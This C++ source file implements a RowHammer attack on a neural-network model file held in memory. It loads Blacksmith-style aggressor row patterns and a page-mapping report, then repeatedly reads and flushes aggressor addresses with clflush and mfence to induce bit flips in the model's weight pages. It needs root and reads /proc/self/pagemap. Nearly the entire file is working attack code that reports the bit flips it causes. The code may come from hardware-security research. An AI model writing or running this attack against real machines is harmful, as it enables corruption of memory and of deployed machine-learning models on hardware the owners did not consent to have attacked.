#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <map>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <x86intrin.h>
#include <chrono>
#include <json-c/json.h>

#define PAGE_SIZE 4096

struct PatternRecord {
    int dram_page;
    std::string pattern_id;
    int aggressor_count;
    std::vector<int> aggressor_rows;
    int total_activations;
    double effectiveness;
};

struct TargetMapping {
    int dnn_page_id;
    int dram_page;
    uint64_t physical_page;
    uint64_t virtual_addr;
    bool found;
    PatternRecord pattern;
    bool has_pattern;
};

class RowhammerAttack {
private:
    std::vector<TargetMapping> targets;
    std::map<int, PatternRecord> pattern_map;
    std::string model_path;
    std::string attack_report_path;
    std::string patterns_file_path;
    int hammer_rounds;
    int total_bit_flips;
    
    void* model_buffer = nullptr;
    size_t model_size = 0;
    int pagemap_fd = -1;
    
    static inline void clflush(volatile void *p) {
        asm volatile("clflush (%0)" :: "r"(p) : "memory");
    }
    
    static inline void mfence() {
        asm volatile("mfence" ::: "memory");
    }
    
    uint64_t get_physical_addr(uint64_t virtual_addr) {
        if (pagemap_fd == -1) {
            pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
            if (pagemap_fd == -1) {
                std::cerr << "Failed to open /proc/self/pagemap: " << strerror(errno) << std::endl;
                return 0;
            }
        }
        
        uint64_t value;
        off_t offset = (virtual_addr / PAGE_SIZE) * sizeof(value);
        if (pread(pagemap_fd, &value, sizeof(value), offset) != sizeof(value)) {
            return 0;
        }
        
        if (!(value & (1ULL << 63))) return 0;
        return value & ((1ULL << 55) - 1);
    }
    
    bool load_pattern_records() {
        std::ifstream file(patterns_file_path);
        if (!file.is_open()) {
            std::cerr << "Failed to open pattern records file: " << patterns_file_path << std::endl;
            return false;
        }
        
        std::string content((std::istreambuf_iterator<char>(file)),
                           std::istreambuf_iterator<char>());
        file.close();
        
        json_object *root = json_tokener_parse(content.c_str());
        if (!root) {
            std::cerr << "Failed to parse pattern records JSON" << std::endl;
            return false;
        }
        
        json_object *records_array;
        if (!json_object_object_get_ex(root, "pattern_records", &records_array)) {
            std::cerr << "No 'pattern_records' array found in JSON" << std::endl;
            json_object_put(root);
            return false;
        }
        
        int record_count = json_object_array_length(records_array);
        std::cout << "[+] Loading " << record_count << " pattern records..." << std::endl;
        
        for (int i = 0; i < record_count; i++) {
            json_object *record = json_object_array_get_idx(records_array, i);
            
            PatternRecord pattern;
            
            json_object *dram_page_obj;
            if (json_object_object_get_ex(record, "dram_page", &dram_page_obj)) {
                pattern.dram_page = json_object_get_int(dram_page_obj);
            }
            
            json_object *pattern_id_obj;
            if (json_object_object_get_ex(record, "pattern_id", &pattern_id_obj)) {
                pattern.pattern_id = json_object_get_string(pattern_id_obj);
            }
            
            json_object *aggressor_count_obj;
            if (json_object_object_get_ex(record, "aggressor_count", &aggressor_count_obj)) {
                pattern.aggressor_count = json_object_get_int(aggressor_count_obj);
            }
            
            json_object *aggressor_rows_obj;
            if (json_object_object_get_ex(record, "aggressor_rows", &aggressor_rows_obj)) {
                int aggressor_array_len = json_object_array_length(aggressor_rows_obj);
                
                if (aggressor_array_len != pattern.aggressor_count) {
                    std::cerr << "Error: Pattern data inconsistent for DRAM page " << pattern.dram_page << std::endl;
                    continue;
                }
                for (int j = 0; j < aggressor_array_len; j++) {
                    json_object *aggressor_obj = json_object_array_get_idx(aggressor_rows_obj, j);
                    int aggressor_row = json_object_get_int(aggressor_obj);
                    pattern.aggressor_rows.push_back(aggressor_row);
                }
            }
            
            json_object *activations_obj;
            if (json_object_object_get_ex(record, "total_activations", &activations_obj)) {
                pattern.total_activations = json_object_get_int(activations_obj);
            }
            
            json_object *effectiveness_obj;
            if (json_object_object_get_ex(record, "effectiveness", &effectiveness_obj)) {
                pattern.effectiveness = json_object_get_double(effectiveness_obj);
            }
            
            pattern_map[pattern.dram_page] = pattern;
        }
        
        json_object_put(root);
        
        std::cout << "[+] Loaded " << pattern_map.size() << " pattern records" << std::endl;
        return !pattern_map.empty();
    }
    
    bool parse_attack_report() {
        std::ifstream file(attack_report_path);
        if (!file.is_open()) {
            std::cerr << "Failed to open attack report: " << attack_report_path << std::endl;
            return false;
        }
        
        std::string line;
        TargetMapping current;
        bool in_mapping = false;
        
        while (std::getline(file, line)) {
            if (line.find("Mapping #") != std::string::npos) {
                if (in_mapping && current.dnn_page_id >= 0) {
                    assign_pattern_to_target(current);
                    targets.push_back(current);
                }
                in_mapping = true;
                current = TargetMapping();
                current.found = false;
                current.has_pattern = false;
            } else if (in_mapping) {
                if (line.find("DNN Page:") != std::string::npos) {
                    sscanf(line.c_str(), "  DNN Page: %d", &current.dnn_page_id);
                } else if (line.find("DRAM Page:") != std::string::npos) {
                    sscanf(line.c_str(), "  DRAM Page: %d", &current.dram_page);
                }
            }
        }
        
        if (in_mapping && current.dnn_page_id >= 0) {
            assign_pattern_to_target(current);
            targets.push_back(current);
        }
        
        std::cout << "[+] Parsed " << targets.size() << " target mappings" << std::endl;
        
        int with_patterns = 0;
        for (const auto& target : targets) {
            if (target.has_pattern) with_patterns++;
        }
        std::cout << "[+] " << with_patterns << "/" << targets.size() 
                  << " targets have patterns" << std::endl;
        
        return !targets.empty();
    }
    
    void assign_pattern_to_target(TargetMapping& target) {
        auto it = pattern_map.find(target.dram_page);
        if (it != pattern_map.end()) {
            target.pattern = it->second;
            target.has_pattern = true;
        } else {
            target.has_pattern = false;
        }
    }
    
    bool verify_model_mapping() {
        std::ifstream maps("/proc/self/maps");
        std::string line;
        
        while (std::getline(maps, line)) {
            if (line.find(model_path) != std::string::npos) {
                size_t dash_pos = line.find('-');
                if (dash_pos != std::string::npos) {
                    std::string start_addr_str = line.substr(0, dash_pos);
                    model_buffer = (void*)strtoull(start_addr_str.c_str(), nullptr, 16);
                    
                    struct stat sb;
                    if (stat(model_path.c_str(), &sb) == 0) {
                        model_size = sb.st_size;
                        std::cout << "[+] Found mapped model at " << model_buffer 
                                  << ", size " << model_size << std::endl;
                        return true;
                    }
                }
            }
        }
        
        std::cerr << "[-] Model not found in memory maps." << std::endl;
        return false;
    }
    
    void execute_pattern_record(const TargetMapping& target) {
        if (!target.has_pattern) {
            std::cout << "    Error: No pattern assigned to target" << std::endl;
            return;
        }
        
        if (!model_buffer) {
            std::cout << "    Error: Model not mapped" << std::endl;
            return;
        }
        
        const PatternRecord& pattern = target.pattern;
        
        std::cout << "  Attacking DRAM page " << target.dram_page 
                  << " (pattern " << pattern.pattern_id << ")" << std::endl;
        
        uint64_t victim_addr = (uint64_t)model_buffer + (target.dnn_page_id * PAGE_SIZE);
        const size_t ROW_SIZE = 8192;
        
        // Create backup of target page before attack
        std::vector<uint8_t> page_backup(PAGE_SIZE);
        memcpy(page_backup.data(), (void*)victim_addr, PAGE_SIZE);
        
        std::vector<volatile uint8_t*> aggressors;
        for (int row_offset : pattern.aggressor_rows) {
            uint64_t aggressor_addr = victim_addr + (row_offset * ROW_SIZE);
            aggressors.push_back((volatile uint8_t*)aggressor_addr);
        }
        
        auto start_time = std::chrono::steady_clock::now();
        
        for (int round = 0; round < hammer_rounds; round++) {
            if (round % 50 == 0) {
                std::cout << "    Round " << round+1 << "/" << hammer_rounds << std::endl;
            }
            
            execute_blacksmith_pattern(aggressors, pattern.total_activations);
            
            mfence();
            usleep(1);
        }
        
        auto end_time = std::chrono::steady_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::seconds>(end_time - start_time);
        
        // Check for bit flips after attack
        int bit_flips = count_bit_flips(page_backup.data(), (uint8_t*)victim_addr, PAGE_SIZE);
        
        std::cout << "    Attack completed (" << duration.count() << "s)" << std::endl;
        std::cout << "    Bit flips detected: " << bit_flips << std::endl;
        
        total_bit_flips += bit_flips;
    }
    
    int count_bit_flips(const uint8_t* original, const uint8_t* current, size_t size) {
        int total_flips = 0;
        for (size_t i = 0; i < size; i++) {
            uint8_t diff = original[i] ^ current[i];
            // Count number of set bits in diff
            while (diff) {
                total_flips += diff & 1;
                diff >>= 1;
            }
        }
        return total_flips;
    }
    
    void execute_blacksmith_pattern(const std::vector<volatile uint8_t*>& aggressors, int total_activations) {
        const int activations_per_ref = total_activations / 64;
        
        for (int ref_cycle = 0; ref_cycle < 64; ref_cycle++) {
            for (int act = 0; act < activations_per_ref; act++) {
                for (auto aggressor : aggressors) {
                    volatile uint8_t temp = *aggressor;
                    clflush((void*)aggressor);
                    (void)temp;
                }
                
                if (act % 8 == 0) {
                    mfence();
                }
            }
            
            mfence();
            
            if (ref_cycle % 8 == 0) {
                usleep(1);
            }
        }
    }
    
public:
    RowhammerAttack(const std::string& attack_report, const std::string& model, 
                    const std::string& patterns_file, int rounds)
        : attack_report_path(attack_report), model_path(model),
          patterns_file_path(patterns_file), hammer_rounds(rounds), total_bit_flips(0) {}
    
    ~RowhammerAttack() {
        if (pagemap_fd != -1) {
            close(pagemap_fd);
        }
    }
    
    bool initialize() {
        std::cout << "[+] Initializing RowHammer attack..." << std::endl;
        
        if (!load_pattern_records()) {
            return false;
        }
        
        if (!parse_attack_report()) {
            return false;
        }
        
        if (!verify_model_mapping()) {
            return false;
        }
        
        return true;
    }
    
    bool execute_attack() {
        std::cout << "\n[+] Executing RowHammer attack..." << std::endl;
        std::cout << "    Targets: " << targets.size() << ", Rounds: " << hammer_rounds << std::endl;
        
        int executed = 0;
        for (size_t i = 0; i < targets.size(); i++) {
            if (targets[i].has_pattern) {
                std::cout << "\nTarget " << (executed+1) << " (DNN page " 
                          << targets[i].dnn_page_id << "):" << std::endl;
                execute_pattern_record(targets[i]);
                executed++;
            }
        }
        
        std::cout << "\n[+] Attack completed: " << executed << " targets hammered" << std::endl;
        std::cout << "[+] Total bit flips detected: " << total_bit_flips << std::endl;
        return true;
    }
    

};

int main(int argc, char* argv[]) {
    if (argc < 4) {
        std::cerr << "Usage: " << argv[0] << " <attack_report.txt> <model.bin> <pattern_records.json> [rounds]" << std::endl;
        return 1;
    }
    
    std::string attack_report = argv[1];
    std::string model_path = argv[2];
    std::string patterns_file = argv[3];
    int hammer_rounds = (argc > 4) ? atoi(argv[4]) : 200;
    
    std::cout << "RowHammer Attack with Custom Pattern Records" << std::endl;
    std::cout << "=============================================" << std::endl;
    std::cout << "Attack report: " << attack_report << std::endl;
    std::cout << "Model file: " << model_path << std::endl;
    std::cout << "Pattern records: " << patterns_file << std::endl;
    std::cout << "Hammer rounds: " << hammer_rounds << std::endl;
    
    // Check if running as root
    if (geteuid() != 0) {
        std::cerr << "\n[-] This program requires root privileges" << std::endl;
        return 1;
    }
    
    RowhammerAttack attack(attack_report, model_path, patterns_file, hammer_rounds);
    
    if (!attack.initialize()) {
        std::cerr << "[-] Attack initialization failed" << std::endl;
        return 1;
    }
    
    if (!attack.execute_attack()) {
        std::cerr << "[-] Attack execution failed" << std::endl;
        return 1;
    }
    
    std::cout << "\n[+] Attack completed successfully" << std::endl;
    return 0;
}